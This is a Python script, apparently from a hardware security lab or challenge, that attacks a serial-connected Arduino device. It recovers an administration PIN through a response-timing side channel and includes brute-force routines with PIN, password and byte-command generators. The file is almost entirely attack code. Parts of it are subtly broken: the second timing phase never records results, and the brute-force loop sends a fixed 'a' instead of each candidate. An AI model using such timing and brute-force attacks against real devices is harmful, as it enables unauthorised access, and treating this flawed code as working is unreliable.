import threading
from itertools import product
from pprint import pprint
from time import time, sleep
from datetime import datetime

import serial


class MySerialWorker(object):
    pending_commands = []
    pending_queries = []

    def __init__(self, *args, **kwargs):
        self.ser = serial.Serial(*args, **kwargs)

    def send_command(self, cmd):
        self.pending_commands.append(cmd)

    def query_command(self, start_time, fd, result_dict, cmd, callback):
        self.pending_queries.append([start_time, fd, result_dict, cmd, callback])

    def _do_query(self, cmd):
        self.ser.write(cmd.encode())
        sleep(0.01)
        return self.ser.readlines()

    def main_loop(self):
        while self.ser.isOpen():
            while self.pending_queries:
                start_time, fd, result_dict, cmd, callback = self.pending_queries.pop(0)
                callback(start_time, fd, result_dict, cmd, self._do_query(cmd))

            if self.ser.inWaiting():
                _ = self.ser.readlines()
            while self.pending_commands:
                self.ser.write(self.pending_commands.pop(0))
            sleep(0.01)

    def run_threaded(self):
        self.thread = threading.Thread(target=self.main_loop)
        self.thread.start()

    def terminate(self):
        self.ser.close()
        self.thread.join()


class MainProgram():
    def __init__(self):
        self.ser = MySerialWorker('/dev/ttyACM0', baudrate=9600, timeout=0.1)
        self.filename = datetime.now().strftime("%H:%M:%S") + ".csv"
        self.pending_command = False

    def on_result(self, start_time, fd, result_dict, cmd, result):
        clean_cmd = cmd.replace("\n", "")
        exec_time = time() - start_time
        print(f"Device responded to {clean_cmd} with {result} in {exec_time}")
        if fd is not None:
            fd.write(f"{exec_time},{clean_cmd},{result}\n")
        if result_dict is not None:
            result_dict[clean_cmd] = {"result": result, "exec_time": exec_time}
        self.pending_command = False

    def send_recv_procedure(self, cmds, result_dict=None, fd=None):
        i = 0
        self.pending_command = True
        self.ser.query_command(start_time=0.0, fd=fd, result_dict=result_dict, cmd=" \n", callback=self.on_result)
        sleep(1)  # getting init message from arduino
        while True:
            if self.pending_command is False:
                if i >= len(cmds):
                    self.ser.terminate()
                    break
                self.pending_command = True
                cmd = cmds[i]
                self.ser.query_command(start_time=time(), fd=fd, result_dict=result_dict, cmd=cmd + "\n",
                                       callback=self.on_result)
                i += 1

        return result_dict

    @staticmethod
    def get_shortest_digits(result_dict):
        longest_evaluation_digits = max(result_dict, key=lambda x: result_dict[x]["exec_time"])
        return longest_evaluation_digits

    def perform_timing_attack(self, pin_length: int):
        self.ser.run_threaded()
        sleep(1)
        # grabbing the "Enter administration PIN"."
        self.pending_command = True
        self.ser.query_command(start_time=0.0, fd=None, result_dict=None, cmd=" \n", callback=self.on_result)
        sleep(1)  # getting init message from arduino

        # first phase (3 digits PINs)
        timing_result_dict = {}
        for combination in list(product(range(0, 10), repeat=3)):
            cmd = "".join(str(x) for x in combination)
            self.pending_command = True
            self.ser.query_command(start_time=time(), fd=None, result_dict=timing_result_dict, cmd=f"{cmd}\n",
                                   callback=self.on_result)
            sleep(0.2)  # reading thread has to wait for arduino to process input
        first_3_digits = self.get_shortest_digits(result_dict=timing_result_dict)
        pprint(timing_result_dict)

        # second phase (following digits)
        known_digits = first_3_digits
        timing_result_dict = {}
        for i in range(pin_length):
            for digit in range(0, 10):
                self.pending_command = True
                self.ser.query_command(start_time=time(), fd=None, result_dict=None, cmd=f"{known_digits}{digit}\n",
                                       callback=self.on_result)
                sleep(0.2)

            next_digit = self.get_shortest_digits(result_dict=timing_result_dict)
            known_digits = known_digits + next_digit
        print(f"{known_digits=}")

    def brute_send_recv_procedure(self, cmds, result_dict=None, fd=None):
        i = 0
        self.pending_command = True
        self.ser.query_command(start_time=0.0, fd=fd, result_dict=result_dict, cmd="\n", callback=self.on_result)
        sleep(2)  # getting init message from arduino
        self.pending_command = True
        self.ser.query_command(start_time=0.0, fd=fd, result_dict=result_dict, cmd="01240", callback=self.on_result)
        while i != 42:
            if self.pending_command is False:
                if i >= len(cmds):
                    self.ser.terminate()
                    break
                self.pending_command = True
                self.ser.query_command(start_time=time(), fd=fd, result_dict=result_dict, cmd="c 5\n",
                                       callback=self.on_result)
                sleep(0.2)
                self.pending_command = True
                cmd = cmds[i]
                self.ser.query_command(start_time=time(), fd=fd, result_dict=result_dict, cmd="a" + "\n",
                                       callback=self.on_result)
                i += 1
                print(f"{i=}", end=": ")

            sleep(0.01)

    def talk_to_device(self, cmds, save_to_file):
        self.ser.run_threaded()
        if save_to_file is True:
            with open(self.filename, 'w') as opened_file:
                self.send_recv_procedure(cmds=cmds, fd=opened_file)
        else:
            self.send_recv_procedure(cmds=cmds)

    def brute_talk_to_device(self, cmds, save_to_file):
        self.ser.run_threaded()
        if save_to_file is True:
            with open(self.filename, 'w') as opened_file:
                self.brute_send_recv_procedure(cmds=cmds, fd=opened_file)
        else:
            self.brute_send_recv_procedure(cmds=cmds)

    def perform_brute_force_attack(self):
        for length in range(3, 4):
            cmds = generate_password(length)
            self.brute_talk_to_device(cmds=cmds, save_to_file=True)




def get_sa():
    cmds = [f"{chr(i)}s" for i in range(32, 126)]
    return cmds


def get_l():
    cmds = ['?s', ' ']
    return cmds


def generate_all_one_byte_commands():
    cmds = [chr(i) for i in range(256)]
    return cmds


def generate_pin(length):
    combinations = list(product(range(0, 10), repeat=length))
    cmds = ["".join(str(x) for x in comb) for comb in combinations]
    cmds = ["01" + suf for suf in cmds]
    print(cmds)
    return cmds


def generate_password(length):
    combinations = list(product(
        ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
         'w', 'x', 'y', 'z'], repeat=length))
    # combinations = list(product(
    #     ['a', 'b', 'm', 'n', 'o', 'p'], repeat=length))
    cmds = ["".join(str(x) for x in comb) for comb in combinations]
    # cmds = ["s " + suf for suf in cmds]
    print(cmds)
    return cmds


def generate_all_two_byte_commands():
    cmds = [chr(i) + chr(j) for i in range(256) for j in range(256)]
    return cmds


if __name__ == "__main__":
    talker = MainProgram()
    talker.perform_timing_attack(pin_length=4)
    # talker.perform_brute_force_attack()
    # talker.talk_to_device(cmds=generate_password(3), save_to_file=True)